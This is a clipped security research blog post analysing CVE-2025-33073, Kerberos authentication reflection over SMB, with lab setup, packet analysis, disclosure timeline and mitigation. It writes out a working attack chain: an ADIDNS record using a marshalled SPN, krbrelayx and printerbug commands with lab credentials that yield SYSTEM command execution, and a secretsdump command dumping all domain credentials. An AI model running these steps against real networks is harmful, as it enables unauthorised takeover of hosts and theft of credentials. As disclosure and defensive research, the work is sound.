---
title: Authentication coercion of machine accounts and Kerberos relaying/reflection over SMB | SySS Tech Blog
source: https://blog.syss.com/posts/kerberos-reflection/
source_host: blog.syss.com
clip_date: 2026-09-28T10:23:50+08:00
trace_id: d96c1aff-1e97-42d4-9906-00ead463a0ce
content_hash: 4723f089b2a522dc49ce5b876a0acbdd10cee2eeb66e48d7a95295155f781048
status: synced
tags:
  - 协议分析
  - 漏洞分析
series: null
feed_source: SySS Tech Blog
ai_summary: 任意无特权域账户可通过强制机器账户认证并把 Kerberos 认证经 SMB 反射回原主机，在默认配置下拿到众多域内主机的管理员权限（CVE-2025-33073）。
ai_summary_style: key-points
images_status:
  total: 21
  succeeded: 7
  failed_urls:
    - /assets/img/papers/kerberos-reflection/adidns3.png
    - /assets/img/papers/kerberos-reflection/relay1.png
    - /assets/img/papers/kerberos-reflection/wireshark-authentication-coercion.png
    - /assets/img/papers/kerberos-reflection/wireshark-tgs.png
    - /assets/img/papers/kerberos-reflection/wireshark-authentication.png
    - /assets/img/papers/kerberos-reflection/wireshark-relay.png
    - /assets/img/papers/kerberos-reflection/kerberos-relaying.svg
    - /assets/img/papers/kerberos-reflection/wireshark-relay-4-ap-req.png
    - /assets/img/papers/kerberos-reflection/wireshark-relay-4-ap-req-decrypted1.png
    - /assets/img/papers/kerberos-reflection/wireshark-relay-4-ap-req-decrypted2.png
    - /assets/img/papers/kerberos-reflection/wireshark-relay-4-ap-req-decrypted3.png
    - /assets/img/papers/kerberos-reflection/wireshark-relay-6-kerberos.png
    - /assets/img/papers/kerberos-reflection/wireshark-relay-6-createservice.png
    - /assets/img/papers/kerberos-reflection/wireshark-relay-6-readfile.png
notion_page_id: 3e975244-d011-819e-963e-cf2de23af4f5
ioc:
  cves:
    - CVE-2025-33073
  cwes: []
  hashes:
    - 3ad36e655d0dbe89941515cdb67a3fd518133dcb
    - 881790dd0df047ce44c3c884dc36b55674cc262a
    - aef69a7e4d2623b2db2094d9331b2b07817fc7a4
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 任意无特权域账户可通过强制机器账户认证并把 Kerberos 认证经 SMB 反射回原主机，在默认配置下拿到众多域内主机的管理员权限（CVE-2025-33073）。
> 
> - **前置条件：** 一个无特权 AD 账户、攻击机与目标 445 端口双向可达、目标未强制 SMB 服务器签名（Win11/Win Server 2025 之前为默认）、可写入 DNS 记录（ADIDNS 即可）。
> - **核心技巧：** SPN 会先经 `CredMarshalTargetInfo`/`CredUnmarshalTargetInfo` 转换，故注册 `srv1` + `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` 的 DNS 名指向攻击机，网络层连到攻击者，而 Kerberos 层目标仍是 `cifs/srv1`。
> - **攻击链：** 用 printerbug/Coercer 触发 `srv1$` 经 SMB 向攻击者发出 `KRB_AP_REQ`，再以打补丁的 `krbrelayx` 将同一请求原样中继回 `srv1`，最终以 `nt authority\system` 执行命令。
> - **反直觉点：** 凭证反射本应不可行，且机器账户 `srv1$` 远程认证通常不具本机管理员权限；若目标是未强制签名的域控则等同全域失陷（DC 默认强制签名）。
> - **缓解与验证：** 组策略启用 "Microsoft network server: Digitally sign communications (always)"；已在默认配置的 Server 2022 + Win10 实验环境及真实攻防中复现。

In this blog article, further technical details concerning the Microsoft Windows SMB security vulnerability [CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073) are presented.

This security vulnerability was independently found and reported to Microsoft within the last few months by different security researchers, and a corresponding security update was released on Patch Tuesday June 2025 (June 10, 2025).

[![Microsoft's acknowledgements for CVE-2025-33073](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/709f1e70977f653d.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/acknowledgements.png "Microsoft’s acknowledgements for CVE-2025-33073") *Microsoft’s acknowledgements for [CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)*

## TL;DR

This blog post describes a variation of Kerberos relaying in Active Directory domains. It does not introduce anything essentially new, but applies existing tools. However, this issue seems to be a similar problem to MS08-068 (NTLM reflection), but for Kerberos. Any authenticated attacker can remotely gain administrative permissions on many domain-joined computers (e.g. except domain controllers, Windows 11 and Windows Server 2025 systems) in the default configuration.

If you’re already familiar with Kerberos and Kerberos relaying, what you probably care about most [is this section](#the-attack-in-detail).

The behavior exploited here is as follows: After authentication coercion of a machine account (which can be deterministically triggered), where the authentication to the attacker’s system usually occurs over SMB/Kerberos, it is possible to relay/reflect the authentication attempt back to the attacked system over SMB/Kerberos, yielding administrative privileges on it. This was verified [in an up-to-date lab environment](#lab-environment-test-setup) and also during real-world engagements.

It neatly fits into the existing research and tooling, which – without claiming completeness (I’m sure I forgot some) – covers:

-   Many variations with different from/to protocols; presented by James Forshaw.[1](#fn:1) [2](#fn:2)
-   Exploitation of Kerberos unconstrained delegation; by Dirk-jan Mollema.[3](#fn:3)
-   Cross-protocol relay attacks, for example from HTTP (to LDAP/LDAPS) (e.g. RBCD/Shadow credentials) or (from SMB/DNS, for instance) to HTTP (e.g. similar to AD CS ESC8); or Kerberos relaying attacks based on MitM of user accounts (e.g. via LLMNR/NBNS or ARP spoofing or any other preferred method, or placing LNK/link files or search connector files on writable shares, etc.) like demonstrated here [4](#fn:4), in Dirk-jan Mollema’s `krbrelayx` [5](#fn:5), in Andrea Pierini’s (decoder-it) `KrbRelayEx` [6](#fn:6) and `KrbRelay-SMBServer` [7](#fn:7), some Potato exploits like `SilverPotato` [8](#fn:8), which use DCOM as a trigger for authentication coercion, or here [9](#fn:9).
-   Local Kerberos relaying for local privilege escalation (e.g. in cube0x0 `krbrelay` [10](#fn:10)).

## Attack Summary

-   Prerequisites:
    -   Access to an arbitrary unprivileged Active Directory account (here `attacker`)
    -   Bidirectional network access from the attacker system to the SMB port (TCP port 445) of the target system to be attacked (here `srv1`) and back from the target system to the SMB port of the attacker system
    -   Server-side SMB signing on `srv1` must not be enforced (this is the default for Windows systems before Windows 11 or Windows Server 2025)
    -   Ability to set a DNS entry; this can usually be done via Active Directory Integrated DNS (ADIDNS), given an arbitrary unprivileged Active Directory account
-   Attack (attacked computer: `srv1`, attacker computers: `attacker-lin` and `attacker-win`):
    -   Adding DNS entry that unmarshalls to correct target SPN
    -   Authentication coercion of `srv1` to `attacker-lin` over Kerberos via SMB (authentication occurs via `KRB_AP_REQ` as machine account `srv1$` of `srv1`)
    -   Relay of Kerberos authentication (`KRB_AP_REQ`) back to `srv1` over SMB
-   Result/impact: administrative privileges on the attacked computer `srv1` (remote privilege escalation). In case the attacked computer is a domain controller without SMB signing (per default DCs enforce SMB signing): full domain compromise.
    
-   Note especially: what may be unexpected in Kerberos relaying in this case compared to NTLM relaying (that results in *greater* impact, compare Pixis / hackndo [11](#fn:11)):
    -   Reflection/relay of authentication from `srv1` back to `srv1` works
    -   Machine account `srv1$` yields administrative privileges on `srv1`
-   Mitigation: enforce SMB signing on `srv1` (Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > Microsoft network server: Digitally sign communications (always): Enabled)

## Introduction: Kerberos

This is a very short primer on the basic functionality of Kerberos, based on the example of a user accessing a network resource like, e.g., a file share on a server `srv1` in the Active Directory domain. We won’t go into much detail and omit information, e.g. how exactly various parts of the protocol exchange are cryptographically protected. Further information can be found, for example, in the Microsoft documentation [12](#fn:12), in this excellent article by Pixis / hackndo [13](#fn:13), or in the RFC [14](#fn:14) specification.

[![Kerberos authentication diagram](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5513a66028d72cb9.svg)](https://blog.syss.com/assets/img/papers/kerberos-reflection/kerberos-normal.svg)

The central authority is the Kerberos Key Distribution Center (KDC). In Active Directory environments its role is assumed by the domain controllers. For our purposes the relevant services inside the KDC are the authentication service (AS) and the ticket granting service (TGS).

If a user wants to access a network resource, they first have to authenticate themselves against the AS of the KDC. This occurs in the `KRB_AS_REQ` message based on a shared secret that is usually derived from the user’s password. In case the authentication is successful, the AS replies with a `KRB_AS_REP` that contains a ticket granting ticket (TGT) and a session key. The TGT is subsequently used to represent the user’s identity and is service-independent.

In the next step, if the user wants to access the SMB service on a server `srv1`, they issue a `KRB_TGS_REQ` to the TGS of the KDC. This request contains the previously obtained TGT for authentication and also specifies which service exactly the user wants to access. The latter part is specified by a Service Principal Name (SPN), which for our purposes consists of a service class (e.g. `cifs` for the SMB file sharing service) and a target server name (e.g. here `srv1`). The TGS in turn responds with a `KRB_TGS_REP`, which contains a service ticket (here abbreviated to ST). This ST is specific to the system and service class (with some caveats) it was issued for and can only be used there.

Finally, the user presents the obtained ST (and an authenticator) in a `KRB_AP_REQ` message to the actual service they want to access (here `cifs/srv1`). Based on the identity of the user listed in the ticket, the server decides either to grant or deny access and sends a corresponding `KRB_AP_REP` back, after which the encapsulating application protocol (here SMB) takes over again.

## Introduction: Kerberos Relaying

Kerberos relaying has been studied in detail e.g. by James Forshaw.[1](#fn:james-forshaw-relay1) [2](#fn:james-forshaw-relay2) Dirk-jan Mollema wrote `krbrelayx` [5](#fn:tools-krbrelayx) and published accompanying research.[3](#fn:dirkjanm-relay1) [4](#fn:dirkjanm-relay2) Another good post is available from Hugo Vincent at Synacktiv.[9](#fn:hugo-vincent-relay)

In summary (for what is relevant here): It is possible to relay the `KRB_AP_REQ` request to other servers. The challenge lies in obtaining a valid `KRB_AP_REQ` targeted for another system, since it is specific to the target SPN. Here, James Forshaw discovered a cool trick in the way SPNs are handled in Windows: The SPN is not taken as is, but first converted through `CredMarshalTargetInfo` / `CredUnmarshalTargetInfo`, which encode other information into the value that is then actually used for authentication.

This essentially allows forcing a mismatch between the target system as seen from a DNS point of view versus the target name and secrets actually used for Kerberos authentication: It allows constructing target names for SPNs that resolve to an attacker-controlled IP via DNS, but whose Kerberos authentication information is taken from the existing service/system. Going back to the example of the previous section: Together with authentication coercion this enables deterministic triggering of a `KRB_AP_REQ` as the machine account `srv1$` for the Kerberos `cifs/srv1` service/SPN, which on the network is sent to an attacker-controlled system and can subsequently be relayed.

## Lab Environment Test Setup

The described behavior was verified in a freshly set up Active Directory domain `mydomain.local` with systems’ IP addresses in the range `10.10.10.0/24`:

| Windows version | Hostname | IP address | Comment/Function |
| --- | --- | --- | --- |
| Windows Server 2025 | `dc1` | `10.10.10.20` | Domain controller, Active Directory |
| Windows Server 2022 | `srv1` | `10.10.10.50` | Server |
| Windows 10 Enterprise | `client1` | `10.10.10.80` | Client |
| Linux (Kali) | `attacker-lin` | `10.10.10.200` | Attacker Linux VM (non-domain-joined) |
| Windows 10 Enterprise | `attacker-win` | `10.10.10.201` | Attacker Windows VM (non-domain-joined) |

The exact Windows Versions are the following:

-   `dc1`: Microsoft Windows Server 2025 Standard Evaluation (10.0.26100)
-   `srv1`: Microsoft Windows Server 2022 Standard Evaluation (10.0.20348)
-   `client1` and `attacker-win`: Microsoft Windows 10 Enterprise Evaluation (10.0.19045)

All machines joined to the domain (`dc1`, `srv1` and `client1`) as well as the domain itself are freshly installed or set up and fully updated (as of 2025-03-31) trial Windows versions. They are set up in default configuration except for the following modification: On `srv1` file and printer sharing was allowed through the Windows firewall to make the SMB service accessible to the network.

All accounts (local and in the Active Directory) have unique passwords assigned.

It is assumed that the attacker has control over an unprivileged Active Directory account, `attacker`; the user was created with `net user attacker aPass!0 /add /domain /y` and is only member of the `Domain Users` group.

## The Attack in Detail

Here, we outline the individual steps for attacking `srv1` in detail. The same steps work identically against `client1`. All steps can be performed using already publicly available tools; however, for `krbrelayx` [a small patch has to be applied](#patch-to-krbrelayx).

Verify that server-side SMB signing on `srv1` is not enforced:

```bash
$ nmap -sVC -p 445 srv1.mydomain.local
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 18:37 CEST
Nmap scan report for srv1.mydomain.local (10.10.10.50)
Host is up (0.00081s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?
MAC Address: 52:54:00:7C:04:FE (QEMU virtual NIC)

Host script results:
|_nbstat: NetBIOS name: SRV1, NetBIOS user: <unknown>, NetBIOS MAC: 52:54:00:7c:04:fe (QEMU virtual NIC)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-03-31T16:38:13
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.66 seconds
```

[![SMB signing is not enforced on srv1](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/891c9f2256e67b4a.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/scan-smb-signing.png)

Note that throughout the blog post the same information is provided as both listings (for searching and copy-pasting) and images (for better visuals).

First, we register the name `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` in the internal DNS and point it to our `attacker-lin` system. An unprivileged Active Directory account is sufficient for this. This can be achieved, for example, via ADIDNS using Powermad [15](#fn:15) from `attacker-win`:

-   On `attacker-win`: open new security context as domain user `attacker`:
    
    ```powershell
    PS C:\> hostname
    attacker-win
    
    PS C:\> runas /netonly /u:mydomain.local\attacker powershell.exe
    Enter the password for mydomain.local\attacker:
    Attempting to start powershell.exe as user "mydomain.local\attacker" ...
    ```
    
-   In that context, check connectivity/authentication:
    
    ```powershell
    PS C:\> net view \\dc1.mydomain.local\ /all
    Shared resources at \\dc1.mydomain.local\
    
     name  Type  Used as  Comment
    
    -------------------------------------------------------------------------------
    ADMIN$      Disk           Remote Admin
    C$          Disk           Default 
    IPC$        IPC            Remote IPC
    NETLOGON    Disk           Logon server 
    SYSVOL      Disk           Logon server 
    The command completed successfully.
    ```
    
    [![Open security context as domain user](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3ee98100d4d77590.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/adidns1.png)
    
-   And then we add the new DNS entry:
    
    ```powershell
    PS C:\> Import-Module C:\Tools\Powermad.ps1
    PS C:\> New-ADIDNSNode -DomainController "dc1.mydomain.local" `
        -Node ("srv1" + "1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA") `
        -DNSRecord (New-DNSRecordArray -Type A -Data "10.10.10.200") -Verbose
    VERBOSE: [+] Domain = mydomain.local
    VERBOSE: [+] Forest = mydomain.local
    VERBOSE: [+] ADIDNS Zone = mydomain.local
    VERBOSE: [+] Distinguished Name =
    DC=srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA,DC=mydomain.local,CN=MicrosoftDNS,DC=DomainDNSZones,DC=mydomain,DC=
    local
    [+] ADIDNS node srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA added
    ```
    
    [![Add DNS entry via ADIDNS using Powermad](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a22ed9f65bf04e70.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/adidns2.png)
    
-   After waiting some time for DNS to sync, the entry should be available:
    
    ```powershell
    PS C:\> nslookup srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
    Server:  UnKnown
    Address:  10.10.10.20
    
    Name:    srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.mydomain.local
    Address:  10.10.10.200
    ```
    
    [![⚠️ 图片托管失败 · DNS entry indeed has been set](https://blog.syss.com/assets/img/papers/kerberos-reflection/adidns3.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/adidns3.png)
    

If not configured correctly, domain controllers may also allow unauthenticated dynamic DNS updates; but this is not the default.

The value `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` is from James Forshaw’s post [2](#fn:james-forshaw-relay2) and its purpose will become clear in the next steps.

Second, we start up a SMB listener (TCP port 445) that will relay/forward the later incoming authentication attempt. This is done using the `krbrelayx` tool by Dirk-jan Mollema [5](#fn:tools-krbrelayx), [with a small patch applied](#patch-to-krbrelayx). As target for the forwarding, the SMB service on `srv1` is specified. Additionally, we instruct `krbrelayx` to execute a shell command on the target system upon successful relay as a demonstration.

```bash
$ python3 krbrelayx.py -t smb://srv1.mydomain.local -debug -c 'cmd /c "whoami /all & hostname & ipconfig"'

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
```

[![⚠️ 图片托管失败 · Start krbrelayx listener](https://blog.syss.com/assets/img/papers/kerberos-reflection/relay1.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/relay1.png)

Third, we coerce an authentication attempt over SMB/Kerberos of the machine account `srv1$` to this newly added `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` DNS hostname entry, which – to reiterate – points to `attacker-lin`. As described by James Forshaw [1](#fn:james-forshaw-relay1), this causes the following behavior: The network connection is made to `attacker-lin`, since this is the target that the DNS entry resolves to. However, on the layer of the application protocol SMB/Kerberos, the authentication in the `KRB_AP_REQ` is made to the SPN `cifs/srv1`. This is due to the way SPNs are constructed for SMB authentication, since after `CredUnmarshalTargetInfo` the `targetName` of [`CREDENTIAL_TARGET_INFORMATIONA`](https://learn.microsoft.com/en-us/windows/win32/api/wincred/ns-wincred-credential_target_informationa) is `srv1`.

For this coercion, control of a low-privileged Active Directory account is sufficient. There are several ways of triggering such an authentication attempt over different remote procedure calls and several tools that implement them, like e.g. [Coercer](https://github.com/p0dalirius/Coercer) or [PetitPotam](https://github.com/topotam/PetitPotam). Here, we choose the printerbug implementation by Dirk-jan Mollema [5](#fn:tools-krbrelayx):

```bash
$ python3 printerbug.py 'mydomain.local/attacker:aPass!0@srv1.mydomain.local' srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
[*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Attempting to trigger authentication via rprn RPC at srv1.mydomain.local
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Triggered RPC backconnect, this may or may not have worked
```

[![Coerce an authentication of the machine account of srv1](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0fc1afa0a881d24d.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/relay2.png)

Now, the incoming connection is relayed by `krbrelayx` back to `srv1` and the instructed commands are executed on `srv1` with `SYSTEM` privileges:

```bash
[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.10.10.50
[*] SMBD: Received connection from 10.10.10.50
[*] SMBD: Received connection from 10.10.10.50
[+] Service RemoteRegistry is already running
[+] ExecuteRemote command: %COMSPEC% /Q /c echo cmd /c "whoami /all & hostname & ipconfig" ^> %SYSTEMROOT%\Temp\__output > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
[*] Executed specified command on host: srv1.mydomain.local

USER INFORMATION
----------------

User Name           SID
=================== ========
nt authority\system S-1-5-18

...

srv1

Windows IP Configuration

Ethernet adapter Ethernet Instance 0:

   Connection-specific DNS Suffix  . : mydomain.local
   Link-local IPv6 Address . . . . . : fe80::d446:415f:da7c:7699%11
   IPv4 Address. . . . . . . . . . . : 10.10.10.50
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.20
```

[![Kerberos relaying and gaining local administrative privileges](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1c47627280bfeb9c.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/relay3.png)

The fact that this works is unexpected in at least the following two ways:

-   Credential reflection should not be possible.
-   The machine account `srv1$`, with which the authentication occurs, typically does not have administrative privileges on the system itself when authenticating remotely over the network.

## Analyzing the Attack

This section covers some analysis of the observed behavior. For this, we mainly focus on network captures taken during the attack on the attacked system `srv1` (attached in `relay-srv1.pcapng`). For peeking into the encrypted Kerberos tickets and data structures, the Kerberos secrets of the lab Active Directory domain were loaded into Wireshark; this allows decryption of ticket material, including the Privilege Attribute Certificate (PAC) (compare also keytab.py [16](#fn:16) and [the provided patch](#patch-to-keytabpy)). The attached `mydomain-keytab.kt` can be loaded in Wireshark in Edit > Preferences > Protocols > KRB5 > Kerberos keytab file; also apply “Try to decrypt Kerberos blobs”. All mentioned raw data (network packet captures, keytab file for decryption of Kerberos traffic, etc.) is provided [in the appendix](#appendix--supplementary-material), so every reader can follow and do their own analysis.

While reading the PCAPs, some specifications can be useful for reference.[14](#fn:RFC4120) [17](#fn:17) [18](#fn:18) [19](#fn:19) [20](#fn:20) [21](#fn:21) [22](#fn:22)

The PCAP file contains the following relevant TCP streams, here shown by their respective Wireshark display filter:

-   `tcp.stream eq 1`: the authentication coercion (traffic of `printerbug.py`), initiated by `attacker-lin`
    
    [![⚠️ 图片托管失败 · Authentication coercion](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-authentication-coercion.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-authentication-coercion.png)
    
-   `tcp.stream eq 5`: the `KRB_TGS_REQ` / `KRB_TGS_REP` of `srv1` to `dc1` to request a service ticket for `cifs/srv1`
    
    [![⚠️ 图片托管失败 · Service ticket request of srv1 and response of dc1](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-tgs.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-tgs.png)
    
-   `tcp.stream eq 4`: the authentication (`KRB_AP_REQ`) of `srv1$` over SMB/Kerberos to the SPN `cifs/srv1`, initiated by `srv1` and going to `attacker-lin`
    
    [![⚠️ 图片托管失败 · Authentication of srv1](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-authentication.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-authentication.png)
    
-   `tcp.stream eq 6`: the relayed-back connection (`KRB_AP_REQ`), including command execution (traffic of `krbrelayx.py`); going from `attacker-lin` back to `srv1`
    
    [![⚠️ 图片托管失败 · Kerberos relay](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-relay.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-relay.png)
    

The following diagram visualizes the attack and shows the relevant steps:

[![⚠️ 图片托管失败 · Authentication coercion and Kerberos relaying](https://blog.syss.com/assets/img/papers/kerberos-reflection/kerberos-relaying.svg)](https://blog.syss.com/assets/img/papers/kerberos-reflection/kerberos-relaying.svg)

The different TCP streams are color-coded. Individual edges map to following packets in `relay-srv1.pcapng`:

-   Edge (1) (coercing) is simplified and itself consists of first authentication then second doing remote procedure calls.
-   Edge (2) corresponds to PCAP packet number 73.
-   Edge (3) corresponds to PCAP packet number 76.
-   Edge (4) corresponds to PCAP packet number 79.
-   Edge (5) corresponds to PCAP packet number 95.
-   Edge (6) corresponds to PCAP packet number 97.
-   Finally, edge (7) (like edge (1)) corresponds to multiple packets; it represents the rest of the TCP/SMB session.

## TCP Stream 4

The main packet relevant here can be identified with the display filter `tcp.stream eq 4 and kerberos`; it is packet number 79. The following figure shows it in context:

[![⚠️ 图片托管失败 · Authentication target is cifs/srv1](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-relay-4-ap-req.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-relay-4-ap-req.png)

Here, we can see the Kerberos `KRB_AP_REQ` authentication from `srv1` (`10.10.10.50`) to `attacker-lin` (`10.10.10.200`). Inside the Kerberos data in SMB2 > Session Setup Request > Security Blob > GSS-API Generic Security Service Application Program Interface > Simple Protected Negotiation (SPNEGO) > negTokenInit > krb5_blob > Kerberos > ap-req > ticket > sname > sname-string, we can see that – as far as Kerberos is concernced – the target for the authentication is `cifs/srv1`.

Later in the packet in the various decrypted parts (including the decrypted PAC) we see that the account that tries to authenticate is indeed `srv1$`, that its RID is 1105, and that it is a member of the Domain Computers group (RID 515):

[![⚠️ 图片托管失败 · Authentication source is srv1$ (1)](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-relay-4-ap-req-decrypted1.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-relay-4-ap-req-decrypted1.png) [![⚠️ 图片托管失败 · Authentication source is srv1$ (2)](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-relay-4-ap-req-decrypted2.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-relay-4-ap-req-decrypted2.png) [![⚠️ 图片托管失败 · Authentication source is srv1$ (3)](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-relay-4-ap-req-decrypted3.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-relay-4-ap-req-decrypted3.png)

## TCP Stream 6

The main packets relevant here can be identified with the display filter `tcp.stream eq 6 and kerberos`. They are:

-   Packet number 95: The `KRB_AP_REQ` in packet 79 of TCP stream 4 is taken by `krbrelayx` and relayed as is back to `srv1` inside a new connection in TCP stream 6 in this packet number 95.
-   Packet number 97: The corresponding `KRB_AP_REP` from `srv1`, confirming successful authentication.

[![⚠️ 图片托管失败 · Kerberos traffic in TCP stream 6](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-relay-6-kerberos.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-relay-6-kerberos.png)

Then, in packet 170 we see the service creation which executes the specified commands and writes their output to a file:

[![⚠️ 图片托管失败 · CreateServiceW command execution](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-relay-6-createservice.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-relay-6-createservice.png)

Finally, the output is read over the `ADMIN$` SMB network share:

[![⚠️ 图片托管失败 · Read command output](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-relay-6-readfile.png)](https://blog.syss.com/assets/img/papers/kerberos-reflection/wireshark-relay-6-readfile.png)

A sidenote: During debugging the issue, we tried various things for debugging this behavior, like

-   diffing decrypted network traffic (`KRB_AP_REQ`) of the working relay attack against normal login over SMB, or
-   dumping the Kerberos CIFS service ticket from `srv1` using Rubeus and trying to use them manually (pass-the-ticket), which did not yield administrative privileges on `srv1`.

However, this didn’t lead anywhere in explaining why the attack works and yields administrative privileges.

## Appendix / Supplementary Material

This appendix contains additional material that should aid in following and debugging the attack. The raw data is provided in [kerberos-reflection.zip](https://blog.syss.com/assets/downloads/kerberos-reflection.zip).

## Patch to krbrelayx

Attached in `patch-krbrelayx.diff` is a patch to `krbrelayx.py` [5](#fn:tools-krbrelayx) that was necessary for the attack to work. It should be applied to commit aef69a7e4d2623b2db2094d9331b2b07817fc7a4. We plan to upstream this patch upon publication.

## PCAP from srv1

Attached in `relay-srv1.pcapng` is a network traffic capture of the authentication coercion and relay attack taken on the attacked system `srv1`.

## PCAP from attacker-lin

Attached in `relay-attacker-lin.pcapng` is a network traffic capture of the authentication coercion and relay attack taken on the attacker system `attacker-lin`.

## Lab domain NTDS.dit dump and keytab

Attached in `mydomain.ntds`, `mydomain.ntds.cleartext`, `mydomain.ntds.kerberos`, `mydomain.sam` and `mydomain.secrets` is a full NTDS.dit dump of all Active Directory accounts in the lab domain. The same information is also provided as a keytab file in `mydomain-keytab.kt` that can be loaded into Wireshark; this allows decryption and further inspection/debugging of the Kerberos traffic and associated Kerberos tickets (including PACs) in the previously provided PCAP files. The dump was taken with impacket’s secretsdump as follows (and then converted using [a patch to Dirk-jan’s keytab.py](#patch-to-keytabpy)):

```
secretsdump.py 'mydomain.local/Administrator:dc1Admin!@dc1.mydomain.local' -outputfile mydomain
```

## Patch to keytab.py

In order to make it easier to inspect Kerberos tickets, we used `keytab.py` by Dirk-jan Mollema.[16](#fn:tools-keytab-py) This tool allows us to convert Kerberos secrets into the keytab file format that can then subsequently be loaded into Wireshark for PCAP analysis. Attached in `patch-keytabpy.diff` is a patch to `keytab.py` that allows direct ingestion of impacket’s secretsdump output. The patch applies to commit 881790dd0df047ce44c3c884dc36b55674cc262a. We plan to upstream this patch upon publication.

## Thanks

Besides the people mentioned in the references/footnotes for their research and tooling, thanks also go to our colleagues for helpful discussion and review, especially Jonas Dopf, Marc Gessler, Josef Ilg, Franz Jahn and Jannik Vieten; and Dr. Julia Kerscher and Jonathan Schneider for linguistic quality assurance.

## Further reading

The security researchers from RedTeam Pentesting and Synacktiv have also already published further technical information regarding [CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073). You can find their corresponding publications here:

-   RedTeam Pentesting GmbH: [Reflective Kerberos Relay Attack](https://www.redteam-pentesting.de/publications/2025-06-11-Reflective-Kerberos-Relay-Attack_RedTeam-Pentesting.pdf) [23](#fn:23)
-   Synacktiv: [NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073](https://www.synacktiv.com/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) [24](#fn:24)

## Timeline

-   2025-03-07: Initial notice of behavior in a lab environment. The subsequent weeks have been spent verifying the actual validity of the attack as well as narrowing attacker requirements and broadening the impact of the attack.
    
-   2025-03-31: Verification of validity of latest variation in up-to-date lab environment.
    
-   2025-04-02: Report to Microsoft/MSRC in PGP-encrypted e-mail with full attachments to secure@microsoft.com.
    
-   2025-04-07: Follow-up inquiry for confirmation of receipt.
    
-   2025-04-09: Verification that the attack still works with the patches from yesterday’s Patch Tuesday applied.
    
-   2025-04-10: Since there was no response from MSRC, submission to web portal msrc.microsoft.com. Confirmation of receipt.
    
